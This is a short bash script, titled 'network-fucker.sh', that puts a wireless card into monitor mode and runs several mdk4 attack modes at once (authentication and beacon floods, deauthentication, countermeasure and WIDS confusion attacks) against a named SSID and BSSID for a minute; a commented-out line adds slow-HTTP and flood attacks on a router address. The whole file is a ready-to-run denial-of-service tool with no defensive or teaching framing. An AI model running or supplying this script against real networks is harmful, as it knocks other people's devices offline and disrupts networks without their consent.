#!/usr/bin/env bash

TIMEOUT=60
# usage: network-fucker.sh <SSID> <BSSID> [interface]
SSID="${1:?usage: network-fucker.sh <SSID> <BSSID> [interface]}"
BSSID="${2:?usage: network-fucker.sh <SSID> <BSSID> [interface]}"
IFACE="${3:-wlan0}"
MON="${IFACE}mon"
# GATEWAY="http://192.168.178.1"

sudo airmon-ng start "$IFACE" 1

sudo mdk4 "$MON" a &
sudo mdk4 "$MON" b &
sudo mdk4 "$MON" d &
sudo mdk4 "$MON" e -t $BSSID &
sudo mdk4 "$MON" f -s a -m s -p 1000 &
sudo mdk4 "$MON" m -t $BSSID &
sudo mdk4 "$MON" w -e "$SSID" &

# slowhttptest -H -c 65539 -l $TIMEOUT -u $GATEWAY & slowhttptest -B -c 65539 -l $TIMEOUT -u $GATEWAY & slowhttptest -R -c 65539 -l $TIMEOUT -u $GATEWAY & slowhttptest -X -c 65539 -l $TIMEOUT -u $GATEWAY & wrk $GATEWAY -c 100000 -d 60 -t 4 &

sleep $TIMEOUT

sudo pkill mdk4
sudo pkill wrk
# sudo pkill slowhttptest 

sudo airmon-ng stop "$MON"
